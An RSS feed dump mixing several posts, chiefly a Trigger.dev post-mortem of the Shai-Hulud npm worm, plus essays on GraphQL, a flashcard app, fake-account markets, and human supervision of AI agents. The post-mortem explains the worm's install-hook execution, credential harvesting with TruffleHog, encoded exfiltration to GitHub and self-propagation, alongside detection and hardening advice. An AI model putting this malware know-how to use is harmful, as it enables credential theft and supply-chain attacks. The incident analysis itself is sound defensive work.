always open to working with other makers and companies, including Arduino, as long as the collaboration allows us to ship great products with strong documentation and truly open source licensing.”]]></content:encoded></item><item><title>How we got hit by Shai-Hulud: A complete post-mortem | Trigger.dev</title><link>https://trigger.dev/blog/shai-hulud-postmortem</link><author>/u/alt69785</author><category>netsec</category><pubDate>Sun, 14 Dec 2025 17:41:49 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[On November 25th, 2025, we were on a routine Slack huddle debugging a production issue when we noticed something strange: a PR in one of our internal repos was suddenly closed, showed zero changes, and had a single commit from... Linus Torvalds?The commit message was just "init."Within seconds, our #git Slack channel exploded with notifications. Dozens of force-pushes. PRs closing across multiple repositories. All attributed to one of our engineers.We had been compromised by Shai-Hulud 2.0, a sophisticated npm supply chain worm that compromised over 500 packages, affected 25,000+ repositories, and spread across the JavaScript ecosystem. We weren't alone: PostHog, Zapier, AsyncAPI, Postman, and ENS were among those hit.This is the complete story of what happened, how we responded, and what we've changed to prevent this from happening again.No Trigger.dev packages were ever compromised. The  packages and  CLI were never infected with Shai-Hulud malware. This incident involved one of our engineers installing a compromised package on their development machine, which led to credential theft and unauthorized access to our GitHub organization. Our published packages remained safe throughout.Malicious packages go liveLegitimate engineer work (from Germany)Attacker monitors engineer activityOn the evening of November 24th, around 20:27 UTC (9:27 PM local time in Germany), one of our engineers was experimenting with a new project. They ran a command that triggered . At that moment, somewhere in the dependency tree, a malicious package executed.We don't know exactly which package delivered the payload. The engineer was experimenting at the time and may have deleted the project directory as part of cleanup. By the time we investigated, we couldn't trace back to the specific package. The engineer checked their shell history and they'd only run install commands in our main trigger repo, cloud repo, and one experimental project.This is one of the frustrating realities of these attacks: once the malware runs, identifying the source becomes extremely difficult. The package doesn't announce itself. The  completes successfully. Everything looks normal.What we do know is that the Shai-Hulud malware ran a  script that:Downloaded and executed TruffleHog, a legitimate security tool repurposed for credential theftScanned the engineer's machine for secrets: GitHub tokens, AWS credentials, npm tokens, environment variablesExfiltrated everything it foundWhen the engineer later recovered files from their compromised laptop (booted in recovery mode), they found the telltale signs:The  directory and trufflehog_3.91.1_darwin_amd64.tar.gz file found on the compromised machine. The  directory was empty, likely cleaned up by the malware to cover its tracks.17 hours of reconnaissanceThe attacker had access to our engineer's GitHub account for 17 hours before doing anything visible. According to our GitHub audit logs, they operated methodically.Just over two hours after the initial compromise, the attacker validated their stolen credentials and began mass cloning:First attacker access, mass cloning begins~70 more repositories cloned (second wave)~90 repositories cloned (third wave)~70 repositories cloned (fourth wave)Attacker switches to India-based infrastructureSimultaneous cloning from both locationsThe simultaneous activity from US and India confirmed we were dealing with a single attacker using multiple VPNs or servers, not separate actors.While our engineer slept in Germany, the attacker continued their reconnaissance. More cloning at 02:56-02:59 UTC (middle of the night in Germany), sporadic activity until 05:32 UTC. Total repos cloned: 669 (527 from US infrastructure, 142 from India).Here's where it gets unsettling. Our engineer woke up and started their normal workday:Triggers workflow on cloud repo (from Germany)Git fetches from US, watching the engineerNormal PR reviews, CI workflows (from Germany)The attacker was monitoring our engineer's activity while they worked, unaware they were compromised.During this period, the attacker created repositories with random string names to store stolen credentials, a known Shai-Hulud pattern:github.com/[username]/xfjqb74uysxcni5ztngithub.com/[username]/ls4uzkvwnt0qckjq27github.com/[username]/uxa7vo9og0rzts362cThey also created three repos marked with "Sha1-Hulud: The Second Coming" as a calling card. These repositories were empty by the time we examined them, but based on the documented Shai-Hulud behavior, they likely contained triple base64-encoded credentials.10 minutes of destructionAt 15:27 UTC on November 25th, the attacker switched from reconnaissance to destruction.The attack began on our  repo from India-based infrastructure:Branch protection rejected force-pushtriggerdotdev/trigger.devThe attack continued on our main repository:triggerdotdev/trigger.dev PR #2706 (release PR)triggerdotdev/trigger.dev PR #2451triggerdotdev/trigger.dev PR #2382Branch protection rejected force-push to trigger.devtriggerdotdev/trigger.dev PR #2482At 15:32:43-46 UTC, 12 PRs on jsonhero-web were closed in 3 seconds. Clearly automated. PRs #47, #169, #176, #181, #189, #190, #194, #197, #204, #206, #208 all closed within a 3-second window.Our critical infrastructure repository was targeted next:triggerdotdev/infra PR #233Branch protection rejected force-push (India)triggerdotdev/infra PR #309Branch protection rejected force-push (India)The final PR was closed on json-infer-types at 15:37:13 UTC.We got a lucky break. One of our team members was monitoring Slack when the flood of notifications started:Our #git Slack channel during the attack. A wall of force-pushes, all with commit message "init."Every malicious commit was authored as:An attacked branch: a single "init" commit attributed to Linus Torvalds, thousands of commits behind main.We haven't found reports of other Shai-Hulud victims seeing this same "Linus Torvalds" vandalism pattern. The worm's documented behavior focuses on credential exfiltration and npm package propagation, not repository destruction. This destructive phase may have been unique to our attacker, or perhaps a manual follow-up action after the automated worm had done its credential harvesting.Within 4 minutes of detection we identified the compromised account, removed them from the GitHub organization, and the attack stopped immediately.Our internal Slack during those first minutes:"Urmmm guys? what's going on?""add me to the call @here""Nick could you double check Infisical for any machine identities""can someone also check whether there are any reports of compromised packages in our CLI deps?"Removed from GitHub organizationRemoved from Infisical (secrets manager)Removed from AWS IAM Identity CenterRemoved from Vercel and CloudflareAWS SSO sessions blocked via deny policy (sessions can't be revoked)IAM user console login deletedRepository clone actions: 669 (public and private), including infrastructure code, internal documentation, and engineering plans.Branches force-pushed: 199 across 16 repositoriesProtected branch rejections: 4. Some of our repositories have main branch protection enabled, but we had not enabled it for all repositories at the time of the incident.npm packages were  compromised. This is the difference between "our repos got vandalized" and "our packages got compromised."Our engineer didn't have an npm publishing token on their machine, and even if they did we had already required 2FA for publishing to npm. Without that, Shai-Hulud would have published malicious versions of , , and others, potentially affecting thousands of downstream users.Production databases or any AWS resources were  accessed. Our AWS CloudTrail audit showed only read operations from the compromised account:ListManagedNotificationEventsThese were confirmed to be legitimate operations by our engineer.One nice surprise: AWS actually sent us a proactive alert about Shai-Hulud. They detected the malware's characteristic behavior (ListSecrets, GetSecretValue, BatchGetSecretValue API calls) on an old test account that hadn't been used in months, so we just deleted it. But kudos to AWS for the proactive detection and notification.GitHub doesn't have server-side reflog. When someone force-pushes, that history is gone from GitHub's servers.But we found ways to recover.Push events are retained for 90 days via the GitHub Events API. We wrote a script that fetched pre-attack commit SHAs:Public repository forks still contained original commits. We used these to verify and restore branches.Developers who hadn't run  (all of us?) still had old SHAs in their local reflog.Within 7 hours, all 199 branches were restored.GitHub app private key exposureDuring the investigation, our engineer was going through files recovered from the compromised laptop and discovered something concerning: the private key for our GitHub App was in the trash folder.When you create a private key in the GitHub App settings, GitHub automatically downloads it. The engineer had created a key at some point, and while the active file had been deleted, it was still in the trash, potentially accessible to TruffleHog.Our GitHub App has the following permissions on customer repositories:Could read/write repository contentsCould read/create/modify PRsCould create/trigger deploymentsCould create/modify check runsCould mark commits as passing/failingCould read repository metadataTo generate valid access tokens, an attacker would need both the private key (potentially compromised) and the installation ID for a specific customer (stored in our database which was not compromised, not on the compromised machine).We immediately rotated the key:Private key discovered in trash folderNew key deployed to test environmentNew key deployed to productionWe found no evidence of unauthorized access to any customer repositories. The attacker would have needed installation IDs from our database to generate tokens, and our database was not compromised as previously mentioned.However, we cannot completely rule out the possibility. An attacker with the private key could theoretically have called the GitHub API to enumerate all installations. We've contacted GitHub Support to request additional access logs. We've also analyzed the webhook payloads to our GitHub app, looking for suspicious push or PR activity from connected installations & repositories. We haven't found any evidence of unauthorized activity in these webhook payloads.We've sent out an email to potentially effected customers to notify them of the incident with detailed instructions on how to check if they were affected. Please check your email for more details if you've used our GitHub app.Technical deep-dive: how Shai-Hulud worksFor those interested in the technical details, here's what we learned about the malware from Socket's analysis and our own investigation.When npm runs the  script, it executes :Downloads or locates the Bun runtimeSpawns a detached Bun process running  with output suppressedReturns immediately so  completes successfully with no warningsThe malware runs in the background while you think everything is fine.The payload uses TruffleHog to scan  for GitHub tokens (from env vars, gh CLI config, git credential helpers), AWS/GCP/Azure credentials, npm tokens from , environment variables containing anything that looks like a secret, and GitHub Actions secrets (if running in CI).Stolen credentials are uploaded to a newly-created GitHub repo with a random name. The data is triple base64-encoded to evade GitHub's secret scanning. (system info and GitHub credentials) (all environment variables) (cloud provider credentials) (filesystem secrets from TruffleHog) (GitHub Actions secrets if any)If an npm publishing token is found, the malware validates the token against the npm registry, fetches packages maintained by that account, downloads each package, patches it with the malware, bumps the version, and re-publishes, infecting more packages.This is how the worm spread through the npm ecosystem, starting from PostHog's compromised CI on November 24th at 4:11 AM UTC. Our engineer was infected roughly 16 hours after the malicious packages went live.If no credentials are found to exfiltrate or propagate, the malware attempts to delete the victim's entire home directory. Scorched earth.File artifacts to look for: , , , , , , ,  directory.Malware file hashes (SHA1):: d60ec97eea19fffb4809bc35b91033b52490ca11: 3d7570d14d34b0ba137d502f042b27b0f37a59fa: d1829b4708126dcc7bea7437c04d1f10eacd4a16We disabled npm scripts globally:This prevents , , and other lifecycle scripts from running. It's aggressive and some packages will break, but it's the only reliable protection against this class of attack.We upgraded to pnpm 10. This was significant effort (had to migrate through pnpm 9 first), but pnpm 10 brings critical security improvements. Scripts are ignored by default. You can explicitly whitelist packages that need to run scripts via pnpm.onlyBuiltDependencies. And the  setting prevents installing packages published recently.To whitelist packages that legitimately need build scripts:This prompts you to select which packages to allow (like , , ).For your global pnpm config:We switched npm publishing to OIDC. No more long-lived npm tokens anywhere. Publishing now uses npm's trusted publishers with GitHub Actions OIDC. Even if an attacker compromises a developer machine, they can't publish packages because there are no credentials to steal. Publishing only happens through CI with short-lived, scoped tokens.We enabled branch protection on all repositories. Not just critical repos or just OSS repos. Every repository with meaningful code now has branch protection enabled.We've adopted Granted for AWS SSO. Granted encrypts SSO session tokens on the client side, unlike the AWS CLI which stores them in plaintext.Based on PostHog's analysis of how they were initially compromised (via ), we've reviewed our GitHub Actions workflows. We now require approval for external contributor workflow runs on all our repositories (previous policy was only for public repositories).The ability for packages to run arbitrary code during installation is the attack surface. Until npm fundamentally changes, add this to your :Yes, some things will break. Whitelist them explicitly. The inconvenience is worth it.pnpm 10 ignores scripts by default and lets you set a minimum age for packages:Newly published packages can't be installed for 3 days, giving time for malicious packages to be detected.Branch protection takes 30 seconds to enable. It prevents attackers from pushing to a main branch, potentially executing malicious GitHub action workflows.Long-lived npm tokens on developer machines are a liability. Use trusted publishers with OIDC instead.If you don't need a credential on your local machine, don't have it there. Publishing should happen through CI only.Our #git Slack channel is noisy. That noise saved us.One of the hardest parts of this incident was that it happened to a person."Sorry for all the trouble guys, terrible experience"Our compromised engineer felt terrible, even though they did absolutely nothing wrong.

A proper production setup with multiple teams, BFFs, downstream services, observability requirements, and real users.And after all that time, I’ve come to a pretty boring conclusion:GraphQL solves a real problem, but that problem is far more niche than people admit. In most enterprise setups, it’s already solved elsewhere, and when you add up the tradeoffs, GraphQL often ends up being a net negative.This isn’t a “GraphQL bad” post. It’s a “GraphQL after the honeymoon” post.what GraphQL is supposed to solveThe main problem GraphQL tries to solve is overfetching.The idea is simple and appealing:the client asks for exactly the fields it needsno backend changes for every new UI requirementOn paper, that’s great. In practice, things are messier.overfetching is already solved by BFFsMost enterprise frontend architectures already have a BFF (Backend for Frontend).That BFF exists specifically to:aggregate multiple downstream callsreturn exactly what the UI needsIf you’re using REST behind a BFF, overfetching is already solvable. The BFF can scope down responses and return only what the UI cares about.Yes, GraphQL can also do this. But here’s the part people gloss over.Most downstream services are still REST.So now your GraphQL layer still has to overfetch from downstream REST APIs, then reshape the response. You didn’t eliminate overfetching. You just moved it down a layer.That alone significantly diminishes GraphQL’s main selling point.There is a case where GraphQL wins here. If multiple pages hit the same endpoint but need slightly different fields, GraphQL lets you scope those differences per query.But let’s be honest about the trade.You’re usually talking about saving a handful of fields per request, in exchange for:That’s a very expensive trade for a few extra kilobytes.implementation time is much higher than RESTGraphQL takes significantly longer to implement than a REST BFF.With REST, you typically:With GraphQL, you now have to:write adapter functions anywaykeep schema, resolvers, and clients in syncGraphQL optimizes consumption at the cost of production speed.In an enterprise environment, production speed matters more than theoretical elegance.observability is worse by defaultThis one doesn’t get talked about enough.GraphQL has this weird status code convention:400 if the query can’t be parsed200 with an  array if something failed during execution200 if it succeeded or partially succeeded500 if the server is unreachableFrom an observability standpoint, this is painful.If you filter dashboards by 2XX, you know those requests succeeded.With GraphQL, a 200 can still mean partial or full failure.Yes, Apollo lets you customize this behavior. But that’s kind of the point. You’re constantly paying a tax in extra configuration, extra conventions, and extra mental overhead just to get back to something REST gives you out of the box.This matters when you’re on call, not when you’re reading blog posts.caching sounds amazing until you live with itApollo’s normalized caching is genuinely impressive.In theory. In practice, it’s fragile.If you have two queries where only one field differs, Apollo treats them as separate queries. You then have to manually wire things so:existing fields come from cacheonly the differing field is fetchedyou still have a roundtripdebugging cache issues becomes its own problemMeanwhile, REST happily overfetches a few extra fields, caches the whole response, and moves on. Extra kilobytes are cheap. Complexity isn’t.the ID requirement is a leaky abstractionApollo expects every object to have an  or  field by default, or you need to configure a custom identifier.That assumption does not hold in many enterprise APIs.don’t have natural unique keysaren’t modeled as globally identifiable entitiesSo now the BFF has to generate IDs locally just to satisfy the GraphQL client.you’re always fetching one extra field anywayWhich is ironic, considering the original goal was to reduce overfetching.REST clients don’t impose this kind of constraint.file uploads and downloads are awkwardGraphQL is simply not a good fit for binary data.then using REST to fetch the file anywayEmbedding large payloads like PDFs directly in GraphQL responses leads to bloated responses and worse performance.This alone breaks the “single API” story.Most frontend and full-stack developers are far more experienced with REST than GraphQL.Introducing GraphQL means:teaching query compositionThat learning curve creates friction, especially when teams need to move fast.REST is boring, but boring scales extremely well.error handling is harder than it needs to beGraphQL error responses are… weird.nullable vs non-nullable fieldsextensions with custom status codesthe need to trace which resolver failed and whyAll of this adds indirection.Compare that to a simple REST setup where:input validation fails, return a 400backend fails, return a 500Simple errors are easier to reason about than elegant ones.GraphQL absolutely has valid use cases.But in most enterprise environments:downstream services are RESToverfetching is not your biggest problemobservability, reliability, and speed matter moreWhen you add everything up, GraphQL often ends up solving a narrow problem while introducing a broader set of new ones.That’s why, after using it in production for years, I’d say this:GraphQL isn’t bad. It’s just niche. And you probably don’t need it.Especially if your architecture already solved the problem it was designed for.]]></content:encoded></item><item><title>Upcoming Speaking Engagements</title><link>https://www.schneier.com/blog/archives/2025/12/upcoming-speaking-engagements-51.html</link><author>Bruce Schneier</author><category>security</category><pubDate>Sun, 14 Dec 2025 17:10:39 +0000</pubDate><source url="https://www.schneier.com/">Schneier on Security</source><content:encoded><![CDATA[This is a current list of where and when I am scheduled to speak:I’m speaking and signing books at the Chicago Public Library in Chicago, Illinois, USA, at 6:00 PM CT on February 5, 2026.

Rather, your
flashcard collection is just a directory of Markdown files, like so:Cards/
  Math.md
  Chemistry.md
  Astronomy.md
  ...
And each file, or “deck”, looks like this:Q: What is the role of synaptic vesicles?
A: They store neurotransmitters for release at the synaptic terminal.

Q: What is a neurite?
A: A projection from a neuron: either an axon or a dendrite.

C: Speech is [produced] in [Broca's] area.

You write flashcards more or less like you’d write ordinary notes, with
lightweight markup to denote basic (question/answer) flashcards and cloze
deletion flashcards. Then, to study, you run:$ hashcards drill <path to the cards directory>
This opens a web interface on , where you can review the
flashcards. Your performance and review history is stored in an SQLite
database in the same directory as the cards. Cards are content-addressed, that
is, identified by the hash of their text.This central design decision yields many benefits: you can edit your flashcards
with your editor of choice, store your flashcard collection in a Git repo,
track its changes, share it on GitHub with others (as I have). You can
use scripts to generate flashcards from some source of structured data (e.g. a
CSV of English/French vocabulary pairs). You can query and manipulate your
collection using standard Unix tools, or programmatically, without having to dig
into the internals of some app’s database.Why build a new spaced repetition app? Mostly because I was dissatisfied with
both Anki and Mochi. But also, additionally, because my flashcards collection is
very important to me, and having it exist either in some remote database, or as
an opaque unusable data blob on my computer, doesn’t feel good. “Markdown files
in a Git repo” gives me a level of ownership that other approaches lack.The rest of this post explains my frustrations with Anki and Mochi, and how I
landed on the design decisions for hashcards.Anki was the first SR system I used. It’s open source, so it will be around
forever; it has a million plugins; it was the first SR system to use FSRS for
scheduling. It has really rich stats, which I think are mostly useless but are
fun to look at. And the note types feature is really good: it lets you
generate a large number of flashcards automatically from structured data.The central problem with Anki is that the interface is really bad. This
manifests in various ways.First, it is ugly to look at, particularly the review screen. And this
diminishes your enjoyment of what is already an often boring and frustrating
process.Second, doing simple things is hard. A nice feature of Mochi is that when you
start the app you go right into review mode. You’re drilling flashcards before
you even realize it. Anki doesn’t have a “study all cards due today”, rather,
you have to manually go into a deck and click the “Study Now” button. So what I
would do is put all my decks under a “Root” deck, and study that. But this is a
hack.And, third: card input uses WYSIWYG editing. So, you’re either jumping from the
keyboard to the mouse (which increases latency, and makes flashcard creation
more frustrating) or you have to remember all these keybindings to do basic
things like “make this text a cloze deletion” or “make this TeX math”.Finally, plugins are a double-edged sword. Because having the  to use
them is nice, but the experience of  using most plugins is bad. The
whole setup feels janky, like a house of cards. Most of the time, if a feature
is not built into the app itself, I would rather live without it than use a plugin.Mochi feels like it was built to address the main complaint about Anki: the
interface. It is intuitive, good looking, shortcut-rich. No jank. Instead of
WYSIWYG, card text is Markdown: this is delightful.There’s a few problems. While Markdown is a very low-friction way to write
flashcards, cloze deletions in Mochi are very verbose. In hashcards, you can
write this:Speech is [produced] in [Broca's] area.
The equivalent in Mochi is this:Speech is {{1::produced}} in {{2::Broca's}} area.
This is a lot of typing. And you might object that it’s only a few characters
longer. But when you’re studying from a textbook, or when you’re copying words
from a vocabulary table, these small frictions add up. If writing flashcards is
frustrating, you’ll write fewer of them: and that means less knowledge
gained. Dually, a system that makes flashcard creation as frictionless as
possible means more flashcards, and more knowledge.Another problem is that Mochi doesn’t have an equivalent of Anki’s note
types. For example: you can make a note type for chemical elements, with
fields like atomic number, symbol, name, etc., and write templates to generate
flashcards asking questions like:What is the atomic number of [name]?What element has atomic number [number]?What is the symbol for [name]?What element has symbol [symbol]?And so on for other properties. This is good. Automation is good. Less work,
more flashcards. Mochi doesn’t have this feature. It has templates, but
these are not as powerful.But the biggest problem with Mochi, I think, is the algorithm. Until very
recently, when they added beta support for FSRS, the algorithm used by
Mochi was even simpler than SM-2. It was based on multipliers:
remembering a card multiplies its interval by a number >1, forgetting a card
multiplies its interval by a number between 0 and 1.The supposed rationale for this is simplicity: the user can reason about the
algorithm more easily. But I think this is pointless. The whole point of an SR
app is the software manages the schedule for you, and the user is completely
unaware of how the scheduler works. The optimality is to have the most advanced
possible scheduling algorithm (meaning the one that yields the most recall for
the least review time) under the most intuitive interface possible, and the user
just reaps the benefits.Obviously without an RCT we can’t compare Mochi/SM-2/FSRS, but my subjective
experience of it is that the algorithm works well for the short-term, and
falters on the long-term. It’s very bad when you forget a mature card: if a card
has an interval of sixty days, and you click forget, you don’t reset the
interval to one day (which is good, because it helps you reconsolidate the lost
knowledge). Rather, the interval is multiplied by the forget multiplier (by
default: 0.5) down to . What’s the use? If I forgot something after
sixty days, I surely won’t have better recall in thirty.You can fix this by setting the forget multiplier to zero. But you have to know
this is how it works, and, crucially: I don’t want to configure things! I don’t
want “scheduler parameter finetuning” to be yet another skill I have to acquire:
I want the scheduler to .In general, I think spaced repetition algorithms are too optimistic. I’d rather
see cards slightly more often, and spend more time reviewing things, than get
stuck in “forgetting hell”. But developers have to worry that making the system
too burdensome will hurt retention.In Anki, it’s the interface that’s frustrating, but the algorithm works
marvelously. In Mochi, the interface is delightful, but it’s the algorithm
that’s frustrating. Because you can spend months and months drilling flashcards,
building up your collection, but when the cards cross some invisible age
threshold, you start to forget them, and the algorithm does not help you relearn
things you have forgotten. Eventually I burned out on it and stopped doing my
reviews, because I expected to forget everything eventually anyhow. And now they
added support for FSRS, but by now I have 1700 cards overdue.Additionally: Mochi has only two buttons, “Forgot” and “Remembered”. This is
simpler for the user, yes, but most SR scheduling algorithms have more options
for a reason: different degrees of recall adjust the card parameters by
different magnitudes.What do I want from a spaced repetition system?The first thing is: card creation must be frictionless. I have learned that the
biggest bottleneck in spaced repetition, for me, is not doing the reviews (I am
very disciplined about this and have done SR reviews daily for months on end),
it’s not even converting conceptual knowledge into flashcards, the biggest
bottleneck is just entering cards into the system.The surest way to shore up your knowledge of some concept or topic is to write
more flashcards about it: asking the same question in different ways, in
different directions, from different angles. More volume means you see the same
information more often, asking in different ways prevents “memorizing the shape
of the card”, and it acts as a kind of redundancy: there are multiple edges
connecting that bit of knowledge to the rest of your mind.And there have been many times where I have thought: I would make this more
solid by writing another flashcard. But I opted not to because the marginal
flashcard is too effortful.If getting cards into the system involves a lot of friction, you write fewer
cards. And there’s an opportunity cost: the card you don’t write is a concept
you don’t learn. Integrated across time, it’s entire oceans of knowledge which
are lost.So: the system should make card entry effortless. This was the guiding principle
behind the design of the hashcards text format. For example, cloze deletions use
square brackets because in a US keyboard, square brackets can be typed without
pressing shift (compare Mochi’s curly brace). And it’s one bracket, not
two. Originally, the format was one line per card, with blank lines separating
flashcards, and question-answer cards used slashes to separate the sides, like
so:What is the atomic number of carbon? / 6

The atomic number of [carbon] is [6].
And this is strictly less friction. But it creates a problem for multi-line
flashcards, which are common enough that they should not be a second-class
citizen. Eventually, I settled on the current format:Q: What is the atomic number of carbon?
A: 6

C: The atomic number of [carbon] is [6].
Which is only slightly more typing, and has the benefit that you can easily
visually identify where a card begins and ends, and what kind of card it is. I
spent a lot of time arguing back and forth with Claude about what the optimal
format should be.Another source of friction is not creating the cards but  them. The
central problem is that your knowledge changes and improves over time. Often
textbooks take this approach where Chapter 1 introduces one kind of ontology,
and by Chapter 3 they tell you, “actually that was a lie, here’s the real
ontology of this subject”, and then you have to go back and edit the old
flashcards to match. Because otherwise you have one card asking, e.g., for the
undergraduate definition of some concept, while another asks you for the
graduate-level definition, creating ambiguity.For this reason, when studying from a textbook, I create a deck for the
textbook, with sub-decks for each chapter. That makes it easy to match the
flashcards to their source material (to ensure they are aligned) and each
chapter deck only has a few tens of cards usually, keeping them navigable.Sometimes you wrote multiple cards for the same concept, so you have to update
them all at once. Finding the related ones can be hard if the deck is large. In
hashcards, a deck is just a Markdown file. The cards immediately above and below
a card are usually semantically related. You just scroll up and down and make
the edits in place.But why plain-text files in a Git repo? Why not use the above format, but in a
“normal” app with a database?The vague idea of a spaced repetition system where flashcards are stored as
plain-text files in a Git repo had been kicking around my cranium for a long
time. I remember asking an Ankihead on IRC circa 2011 if such a thing
existed. At some point I read Andy Matuschak’s note on his
implementation of an SR system. In his system, the flashcards are colocated with
prose notes. The notation is similar to mine:  and  tags for
question-answer cards, and  for cloze deletions. And the cards
are content-addressed: identified by their hash. Which is an obviously good
idea. But his code is private and, besides, I feel that prose notes and
flashcards are very different beasts, and I don’t need or want them to mix.But I think the idea of plain-text spaced repetition got bumped up the priority
queue because I spontaneously started using a workflow that was similar to my
current hashcards workflow.When studying from a textbook or a website, I’d write flashcards in a Markdown
file. Usually, I used a shorthand like  for cloze deletions. Then I’d use
a Python script to transform the shorthand into the  notation used by Mochi. And I’d edit the flashcards in the file, as
my knowledge built up and my sense of what was relevant and important to
remember improved. And then, when I was done with the chapter or document or
whatever, only then, I would manually import the flashcards into Mochi.And it struck me that the last step was kind of unnecessary. I was already
writing my flashcards as lightly-annotated Markdown in plain-text files. I had
already implemented FSRS out of curiosity. I was looking for a
personal project to build during funemployment. So hashcards was by then a very
neatly-shaped hole that I just needed to paint inside.It turns out that using plain-text storage has many synergies:You can edit the cards using whatever editor you use, build up a library of
card-creating macros, and navigate the collection using the editor’s file
browser.You can query and update the collection using standard Unix tools, or a
programming language, e.g. using  to get the total number of words in the
collection, or using  to make a bulk-update to a set of cards.You can use Git for version control. Git is infinitely more featureful than
the change-tracking of any SR app: you can edit multiple cards in one commit,
branch, merge, use pull requests, etc.You can make your flashcards public on GitHub. I often wish people put more of
themselves out there: their blog posts, their dotfiles, their study notes. And
why not their flashcards? Even if they are not useful to someone else, there
is something enjoyable about reading what someone else finds interesting, or
enjoyable, or worth learning.You can generate flashcards using scripts (e.g., turn a CSV of foreign
language vocabulary into a deck of flashcards), and write a Makefile to tie
the script, data source, and target together. I do this in my
personal deck. Anki’s note types don’t have to be built into hashcards,
rather, you can DIY it using some Python and make.The result is a system where creating and editing flashcards is nearly
frictionless, that uses an advanced spaced repetition scheduler, and which
provides an elegant UI for drilling flashcards. I hope others will find it
useful.]]></content:encoded></item><item><title>Ask HN: What Are You Working On?

An account on Telegram increased in price by an average of 12%, and by 15% on WhatsApp.Accounts on these apps are tied to visible phone numbers, making it easy to see the country of origin. As such, those behind influence operations must register fake accounts locally, say researchers, increasing demand for SMS verifications in targeted nations.However, on social media platforms like Facebook or Instagram, where no link between price and elections was found, fake accounts can be registered in one country and used in another. They also have greater reach which keeps demand high.“A fake Facebook account registered in Russia can post about the US elections and most users will be none the wiser. This isn’t true of apps like Telegram and WhatsApp,” said Roozenbeek.“Telegram is widely used for influence operations, particularly by state actors such as Russia, who invested heavily in information warfare on the channel.” WhatsApp and Telegram are among platforms with consistently expensive fake accounts, averaging $1.02 and $0.89 respectively.The manipulation market’s big players have major customer bases in China and the Russian Federation, say the research team, who point out that Russian and Chinese payment systems are often used, and the grammar on many sites suggests Russian authorship. These vendors sell accounts registered in countries around the world.“It is hard to see state-level political actors at work, as they often rely on closed-loop infrastructure. However, we suspect some of this is still outsourced to smaller players in the manipulation market,” said Dek.Small vendors resell and broker existing accounts, or manually create and “farm” accounts. The larger players will provide a one-stop shop and offer bulk order services for follower numbers or fake accounts, and even have customer support.A  co-authored by Dek showed that around ten Euros on average (just over ten US dollars) can buy some 90,000 fake views or 200 fake comments for a typical social media post.“The COTSI shines a light on the shadow economy of online manipulation by turning a hidden market into measurable data,” added co-author of the new  paper Prof Sander van der Linden. “Understanding the cost of online manipulation is the first step to dismantling the business model behind misinformation.”*The data used in the study published in Science, as well as the additional analyses, was collected between 25 July 2024 and 27 July 2025.** In April 2025, the UK became the first country in Europe to pass legislation making SIM farms illegal. Researchers say that COTSI can be used to track the effects of this law once it is implemented.*** Lead author Anton Dek explains: “By virtual SIM, we mean virtual phone numbers typically provided by Communications Platform as a Service (CPaaS) or Internet-of-Things connectivity providers.”“These services make it easy to purchase thousands of numbers for business purposes. Such numbers are usually inexpensive per unit, but they often carry metadata indicating that they belong to a CPaaS provider, and many platforms have learned to block verifications coming from them. On the other hand, when a physical SIM card (or eSIM) from a conventional carrier is used, it is much harder to distinguish from a normal consumer’s number.”**** The platforms used were Google/YouTube/Gmail; Facebook; Instagram; Twitter/X; WhatsApp; TikTok; LinkedIn; Telegram. passed by the Russian Federation banned third-party account registrations, which saw vendors suspend SMS verification registered in Russia alone as of September 2025.

We stopped at the end of the first chapter, “Introduction”, of the paper.In this post, we will continue with the second chapter, “Approaches to solutions”, and see what we can learn there.However, before we start: Some of the observations and recommendations made in the paper must be taken with a grain of salt when applying them to the AI-based automation attempts of today. When monitoring an industrial production plant, it is often a matter of seconds until a human operator must act if something goes wrong to avoid severe or even catastrophic accidents.Therefore, it is of the highest importance to design industrial control stations in a way that a human operator can recognize deviations and malfunctions as easily as possible and immediately trigger countermeasures. A lot of work is put into the design of all the displays and controls, like, e.g., the well-known emergency stop switch in a screaming red color that is big enough to be punched with a flat hand, fist or alike within a fraction of a second if needed.When it comes to AI-based solutions automating white-collar work, we usually do not face such critical conditions. However, this is not a reason to dismiss the observations and recommendations in the paper easily because, e.g.:Most companies are efficiency-obsessed. Hence, they also expect AI solutions to increase “productivity”, i.e., efficiency, to a superhuman level. If a human is meant to monitor the output of the AI and intervene if needed, this requires that the human needs to comprehend what the AI solution produced at superhuman speed – otherwise we are down to human speed. This presents a quandary that can only be solved if we enable the human to comprehend the AI output at superhuman speed (compared to producing the same output by traditional means).Most companies have a tradition of nurturing a culture of urgency and scarcity, resulting in a lot of pressure towards and stress for the employees. Stress is known to trigger the fight-or-flight mode (an ancient survival mechanism built into us to cope with dangerous situations) which massively reduces the normal cognitive capacity of a human. While this mechanism supports humans in making very quick decisions and taking quick actions (essential in dangerous situations), it deprives them of the ability to conduct any deeper analysis (not being essential in dangerous situations). If deeper analysis is required to make a decision, this may take a lot longer than without stress – if possible at all. This means we need to enable humans to conduct deeper analysis under stress as well or to provide the information in a way that eliminates the need for deeper analysis (which is not always possible).If we let this sink in (plus a few other aspects, I did not write down here but you most likely will add in your mind), we quickly come to the conclusion that also in our AI-related automation context humans are often expected to make quick decisions and act based on them, often under conditions that make it hard (if not impossible) to conduct any in-depth analysis.If we then also take into account, that depending on the situation a wrong result produced by an AI solution which eluded the human operator may have severe consequences in the worst case (e.g., assume a major security incident due to a missed wrongdoing of the AI solution), the situation is not that far away anymore from the situation in an industrial plant’s control station.Summarizing, we surely need to add the necessary grain of salt, i.e., ask ourselves how strict the timing constraints in our specific setting are to avoid comparing apples and oranges in the worst case. However, in general we need to consider the whole range of possible settings which will – probably more often than we think – include that humans need to make decisions in a very short time under stressful conditions (which makes things more precarious).This brings us immediately to Lisanne Bainbridge’s first recommendation:In any situation where a low probability event must be noticed quickly then the operator must be given artificial assistance, if necessary even alarms on alarms.Due to the learnings people have made, a lot of effort has been put into the design of the displays, the controls and also the alerting mechanisms of industrial production control stations, making sure the human operators can make their jobs as good, as stress-free and as reliable as possible.The usual idea is that a single human controls a fleet of AI agents that are designed to do some kind of job, e.g., writing code. Sometimes, most agents are generic “workers”, orchestrated by some kind of supervisor that delegates parts of the work to the worker agents. Sometimes, the different agents are “specialists”, each for a certain aspect of the job to be done, that collaborate using some kind of choreography (or are also orchestrated by a supervisor). While the generic workers are easier to set up, the specialized workers usually produce more accurate results.Because these AI-based agents sometimes produce errors, a human – in our example a software developer – needs to supervise the AI agent fleet and ideally intervenes  the AI agents do something they should not do. Therefore, the AI agents typically create a plan of what they intend to do first (which as a side effect also increases the likelihood that they do not drift off). Then, the human verifies the plan and approves it if it is correct, and the AI agents execute the plan. If the plan is 